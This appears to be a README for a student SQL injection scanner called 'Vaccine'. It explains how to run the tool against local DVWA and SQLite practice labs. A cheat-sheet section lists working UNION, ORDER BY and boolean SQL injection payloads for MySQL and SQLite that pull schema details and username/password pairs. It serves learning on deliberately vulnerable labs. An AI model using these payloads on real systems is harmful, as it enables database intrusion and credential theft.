# Vaccine - Web (Cybersecurity)

Detect SQL injection using a given URL
  - Check `Error` and `Union` SQL injections
  - Check `Mysql` and `SQLite` database types

Display following information in case a website is confirmed to be vulnerable
  - Payload used
  - Database names
  - Table names
  - Column names
  - Other values

Display result in terminal and store in a log file (default: `log.txt`)

<img width="815" alt="Capture d’écran 2023-12-17 à 17 24 18" src="https://github.com/mfunyu/Stockholm/assets/60470877/ff270001-5e5d-480b-966d-617b53e54fa1">

## Usage

  ```
  usage: vaccine.py [-h] [-o O] [-x X] [-i] URL

  positional arguments:
    URL

  optional arguments:
    -h, --help  show this help message and exit
    -o O        Archive file, if not specified it will be stored in a default one.
    -x X        Type of request, if not specified GET will be used.
    -i          Specify talbe and column name using input.
  ```

- Start running docker containers
  ```
  make setup
  ```


## ① Damn Vulnerable Web Application [(github)](https://github.com/digininja/DVWA)

|  | data |
| - | - |
| url |  http://localhost:8080/vulnerabilities/sqli/index.php |
| method | GET |
| token | required |

1. Start docker container (`make setup`)
   ```
   docker run -it -d -p 8080:80 vulnerables/web-dvwa
   ```
2. Initialize database manually
   - http://localhost:8080/setup.php

3. Login manually
   - http://localhost:8080/login.php
   ```
   username: admin
   password: password
   ```

4. Get cookie
   - http://localhost:8080/index.php
   - get cookie value of `PHPSESSID`
     - inspect -> Application tab -> Storage -> Cookies

5. Set cookie to evn variable
   ```
   export TOKEN=YOUR_COOKIE
   ```

## ② sqli-playground [(github)](https://gitlab.cylab.be/cylab/play/sqlite-injection/)

|  | data |
| - | - |
| url | http://localhost:8000 | 
| method | POST |
| token | - |

1. Start docker container (`make setup`)
   ```
   docker run -d -p 8000:80 gitlab.cylab.be:8081/cylab/play/sqlite-injection
   ```

# SQL Injection

## Other SQL injection sites

- https://altoromutual.com/login.jsp

- https://redtiger.labs.overthewire.org/

## 1. ERROR
- Use `ORDER BY` to check numbers of colums
```
' ORDER BY 1--
' ORDER BY 2--
...
```

## 2. UNION

### a. MySQL
- https://portswigger.net/web-security/sql-injection/union-attacks

- Get database name
```
' UNION SELECT null, DATABASE() #
```
- Get table_names
```
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa' #
```
- Get column_names
```
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users'#
```

### b. SQLite

- Get table_names
```
' union select null, null, tbl_name from sqlite_master--
```
- Get column_names
```
' union select null, null, sql from sqlite_master where name="users"--
```


- working other query examples
```
' union select null, username, password from users --
```


## Boolean

```
' or 1=2--
```

```
' or (select count(*) from app.accounts where substr(password, 1, 1)='a') >0--
